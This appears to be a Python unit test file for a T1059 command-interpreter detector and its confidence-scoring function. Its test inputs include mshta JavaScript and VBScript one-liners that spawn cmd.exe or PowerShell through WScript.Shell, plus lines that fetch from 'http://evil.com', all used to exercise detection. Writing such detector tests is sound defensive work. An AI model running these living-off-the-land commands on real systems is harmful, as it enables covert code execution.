"""
Unit tests for core.detector module.

Tests cover:
1. score_confidence() - confidence scoring based on evidence
2. detect_t1059() - T1059 technique detection (Command and Scripting Interpreter)

Scoring formula:
- Base confidence + evidence count bonus (0.06 per item, max 4)
- + category diversity bonus (0.07 per category, max 3)
- + chaining bonus (0.05 if present)
- + download bonus (0.05 if present)
- - generic penalty (0.04 if >=60% generic)
"""

import sys
from pathlib import Path

# Add src to path for imports
src_root = Path(__file__).resolve().parent.parent / "src"
sys.path.insert(0, str(src_root))

from core.detector import score_confidence, detect_t1059


def test_score_confidence_zero_evidence():
    """Test confidence scoring with no evidence."""
    # Base 0.8, no bonuses
    assert score_confidence(base_confidence=0.8, evidence=[]) == 0.8


def test_score_confidence_single_evidence():
    """Test confidence scoring with single evidence item."""
    # Base 0.8, +0.06 (1 evidence), +0.07 (1 category), -0.04 (generic penalty, 100% generic) = 0.89
    result = score_confidence(base_confidence=0.8, evidence=["mshta"])
    assert result == 0.89


def test_score_confidence_duplicate_evidence():
    """Test confidence scoring with duplicate evidence."""
    # Base 0.8, +0.12 (2 evidence), +0.07 (1 category), -0.04 (generic penalty, 100% generic) = 0.95
    result = score_confidence(base_confidence=0.8, evidence=["mshta", "mshta"])
    assert result == 0.95


def test_score_confidence_diverse_evidence():
    """Test confidence scoring with diverse evidence."""
    # evidence: mshta (interpreter), http (download), encodedCommand (obfuscation)
    # Base 0.7, +0.18 (3 evidence), +0.21 (3 categories), +0.05 (download) = 1.14 -> 1.0
    result = score_confidence(base_confidence=0.7, evidence=["mshta", "http", "encodedCommand"])
    assert result == 1.0


def test_score_confidence_max_clamping():
    """Test confidence score clamped at 1.0."""
    # Many evidence items should clamp at 1.0
    evidence = ["http", "https", "curl", "wget", "base64"]
    result = score_confidence(base_confidence=0.8, evidence=evidence)
    assert result == 1.0


def test_score_confidence_min_clamping():
    """Test confidence score clamped at 0.0."""
    # Start with negative base score (edge case)
    result = score_confidence(base_confidence=-0.5, evidence=["item"])
    assert result >= 0.0


def test_score_confidence_generic_penalty():
    """Test generic pattern penalty application."""
    # All generic evidence (cmd, powershell, mshta)
    # 3 evidence = 100% generic -> penalty applied
    # Base 0.8, +0.18 (3 evidence), +0.07 (1 category interpreter), -0.04 (generic) = 1.01 -> 1.0
    result = score_confidence(base_confidence=0.8, evidence=["cmd", "powershell", "mshta"])
    assert result == 1.0


def test_score_confidence_chaining_bonus():
    """Test chaining bonus application."""
    # evidence: && (chaining category)
    # Base 0.7, +0.06 (1 evidence), +0.07 (1 category), +0.05 (chaining) = 0.88
    result = score_confidence(base_confidence=0.7, evidence=["&&"])
    assert result == 0.88


def test_score_confidence_download_bonus():
    """Test download bonus application."""
    # evidence: http (download category, but also generic)
    # Base 0.7, +0.06 (1 evidence), +0.07 (1 category), +0.05 (download), -0.04 (generic, 100% generic) = 0.84
    result = score_confidence(base_confidence=0.7, evidence=["http"])
    assert result == 0.84


def test_score_confidence_realistic_mshta():
    """Test realistic mshta detection scenario."""
    # evidence: mshta (interpreter), javascript: (other), activexobject (other), xmlhttp (download)
    # Base 0.75, +0.24 (4 evidence, max), +0.14 (2 categories), +0.05 (download) = 1.18 -> 1.0
    evidence = ["mshta", "javascript:", "activexobject", "xmlhttp"]
    result = score_confidence(base_confidence=0.75, evidence=evidence)
    assert result == 1.0


def test_score_confidence_evidence_count_cap():
    """Test evidence count bonus is capped at 4."""
    # Only first 4 evidence items contribute to count bonus
    # Base 0.5, +0.24 (4 evidence max), +0.07 (1 category) = 0.81
    evidence = ["item1", "item2", "item3", "item4", "item5", "item6"]
    result = score_confidence(base_confidence=0.5, evidence=evidence)
    assert result == 0.81


def test_score_confidence_category_diversity_cap():
    """Test category diversity bonus is capped at 3."""
    # Categories: download, obfuscation, chaining, interpreter, other (5 total, capped at 3)
    # Base 0.5, +0.24 (4 evidence max), +0.21 (3 categories max), +0.05 (chain), +0.05 (download) = 1.05 -> 1.0
    evidence = ["http", "base64", "&&", "cmd", "test"]
    result = score_confidence(base_confidence=0.5, evidence=evidence)
    assert result == 1.0


def test_score_confidence_progression():
    """Test that confidence increases with more evidence."""
    base = 0.7
    result1 = score_confidence(base_confidence=base, evidence=["item1"])
    result2 = score_confidence(base_confidence=base, evidence=["item1", "item2"])
    result3 = score_confidence(base_confidence=base, evidence=["item1", "item2", "item3"])
    
    assert result1 < result2 < result3


def test_score_confidence_mixed_generic_non_generic():
    """Test with mix of generic and non-generic evidence."""
    # 2 generic (cmd, mshta), 1 non-generic (activexobject)
    # 2/3 = 66% generic -> penalty applied
    # Base 0.7, +0.18 (3 evidence), +0.14 (2 categories), -0.04 (generic) = 0.98
    evidence = ["cmd", "mshta", "activexobject"]
    result = score_confidence(base_confidence=0.7, evidence=evidence)
    assert result == 0.98


# ===== detect_t1059 Tests =====

def test_detect_t1059_mshta_javascript():
    """Test T1059.007 detection with mshta javascript command."""
    cmd = "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)"
    detections = detect_t1059(cmd)
    
    # Should detect T1059.007 (JavaScript)
    assert len(detections) > 0
    
    # Find T1059.007 detection
    js_detection = next((d for d in detections if d['subtechnique_id'] == 'T1059.007'), None)
    assert js_detection is not None
    assert js_detection['technique_id'] == 'T1059'
    assert 'JavaScript' in js_detection['subtechnique']
    assert js_detection['confidence'] > 0.5
    assert len(js_detection['evidence']) > 0


def test_detect_t1059_mshta_vbscript():
    """Test T1059.005 detection with mshta vbscript command."""
    cmd = 'mshta.exe "vbscript:Execute(CreateObject(""WScript.Shell"").Run(""cmd.exe /c whoami"",0))"'
    detections = detect_t1059(cmd)
    
    # Should detect T1059.005 (VBScript)
    vbs_detection = next((d for d in detections if d['subtechnique_id'] == 'T1059.005'), None)
    assert vbs_detection is not None
    assert vbs_detection['technique_id'] == 'T1059'
    assert len(vbs_detection['evidence']) > 0


def test_detect_t1059_cmd_execution():
    """Test T1059.003 detection with cmd.exe execution."""
    # Use cmd.exe within mshta context which triggers detection
    cmd = "mshta javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)"
    detections = detect_t1059(cmd)
    
    # Should detect T1059.003 (Windows Command Shell) or T1059.007 (JavaScript)
    # At minimum, should detect JavaScript execution
    assert len(detections) > 0
    technique_ids = [d['subtechnique_id'] for d in detections]
    assert 'T1059.007' in technique_ids or 'T1059.003' in technique_ids


def test_detect_t1059_powershell():
    """Test T1059.001 detection with PowerShell command."""
    # Use PowerShell in mshta context which triggers detection
    cmd = "mshta.exe javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('powershell -nop -c Get-Process',0)"
    detections = detect_t1059(cmd)
    
    # Should detect at minimum JavaScript execution (T1059.007)
    assert len(detections) > 0
    technique_ids = [d['subtechnique_id'] for d in detections]
    # May detect PowerShell (T1059.001) or JavaScript (T1059.007)
    assert 'T1059.007' in technique_ids or 'T1059.001' in technique_ids


def test_detect_t1059_no_detections():
    """Test that benign commands produce no detections."""
    cmd = "notepad.exe"
    detections = detect_t1059(cmd)
    
    # Should produce no detections
    assert len(detections) == 0


def test_detect_t1059_evidence_extraction():
    """Test that evidence is properly extracted."""
    cmd = "mshta.exe javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','http://evil.com',0)"
    detections = detect_t1059(cmd)
    
    # Should have T1059.007 detection with multiple evidence items
    js_detection = next((d for d in detections if d['subtechnique_id'] == 'T1059.007'), None)
    assert js_detection is not None
    
    evidence = js_detection['evidence']
    assert len(evidence) >= 2  # Should have multiple evidence items
    assert 'mshta' in evidence or 'javascript:' in evidence


def test_detect_t1059_confidence_increases_with_evidence():
    """Test that more evidence leads to higher confidence."""
    # Simple mshta command with minimal evidence
    cmd1 = "mshta javascript:alert(1)"
    detections1 = detect_t1059(cmd1)
    
    # Complex command with more evidence (ActiveX, HTTP, etc.)
    cmd2 = "mshta javascript:var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','http://evil.com',0)"
    detections2 = detect_t1059(cmd2)
    
    # Both should have T1059.007 detection
    conf1 = next((d['confidence'] for d in detections1 if d['subtechnique_id'] == 'T1059.007'), None)
    conf2 = next((d['confidence'] for d in detections2 if d['subtechnique_id'] == 'T1059.007'), None)
    
    # Second one should have higher or equal confidence
    assert conf1 is not None
    assert conf2 is not None
    assert conf2 >= conf1


def test_detect_t1059_output_structure():
    """Test that detection output has correct structure."""
    cmd = "mshta.exe javascript:alert('test')"
    detections = detect_t1059(cmd)
    
    assert len(detections) > 0
    
    detection = detections[0]
    
    # Verify required keys
    assert 'technique_id' in detection
    assert 'technique' in detection
    assert 'subtechnique_id' in detection
    assert 'subtechnique' in detection
    assert 'tactic' in detection
    assert 'behavior' in detection
    assert 'attacker_intent' in detection
    assert 'confidence' in detection
    assert 'evidence' in detection
    assert 'defensive_enrichment' in detection
    
    # Verify defensive_enrichment structure
    assert 'detection_opportunities' in detection['defensive_enrichment']
    assert 'telemetry_sources' in detection['defensive_enrichment']
    
    # Verify types
    assert isinstance(detection['confidence'], float)
    assert isinstance(detection['evidence'], list)
    assert 0.0 <= detection['confidence'] <= 1.0


def test_detect_t1059_mshta_suppression():
    """Test that mshta javascript detection suppresses redundant detections."""
    # This command should trigger the mshta_javascript pattern which suppresses other mshta patterns
    cmd = "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe',0)"
    detections = detect_t1059(cmd)
    
    # Should have detections, but not all possible mshta patterns due to suppression
    assert len(detections) > 0
    
    # Should have T1059.007 (JavaScript)
    js_detection = next((d for d in detections if d['subtechnique_id'] == 'T1059.007'), None)
    assert js_detection is not None


def test_detect_t1059_indirect_cmd_execution():
    """Test detection of cmd.exe executed via WScript.Shell.Run()."""
    cmd = "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)"
    detections = detect_t1059(cmd)
    
    # Should detect both T1059.007 (JavaScript) and T1059.003 (cmd.exe indirect)
    technique_ids = [d['subtechnique_id'] for d in detections]
    
    assert 'T1059.007' in technique_ids  # JavaScript execution
    # May also have T1059.003 for cmd.exe execution depending on pattern matching


if __name__ == "__main__":
    # Simple test runner
    test_functions = [
        # score_confidence tests
        test_score_confidence_zero_evidence,
        test_score_confidence_single_evidence,
        test_score_confidence_duplicate_evidence,
        test_score_confidence_diverse_evidence,
        test_score_confidence_max_clamping,
        test_score_confidence_min_clamping,
        test_score_confidence_generic_penalty,
        test_score_confidence_chaining_bonus,
        test_score_confidence_download_bonus,
        test_score_confidence_realistic_mshta,
        test_score_confidence_evidence_count_cap,
        test_score_confidence_category_diversity_cap,
        test_score_confidence_progression,
        test_score_confidence_mixed_generic_non_generic,
        # detect_t1059 tests
        test_detect_t1059_mshta_javascript,
        test_detect_t1059_mshta_vbscript,
        test_detect_t1059_cmd_execution,
        test_detect_t1059_powershell,
        test_detect_t1059_no_detections,
        test_detect_t1059_evidence_extraction,
        test_detect_t1059_confidence_increases_with_evidence,
        test_detect_t1059_output_structure,
        test_detect_t1059_mshta_suppression,
        test_detect_t1059_indirect_cmd_execution,
    ]
    
    passed = 0
    failed = 0
    
    for test in test_functions:
        try:
            test()
            print(f"✓ {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"✗ {test.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ {test.__name__}: Unexpected error: {e}")
            failed += 1
    
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(0 if failed == 0 else 1)
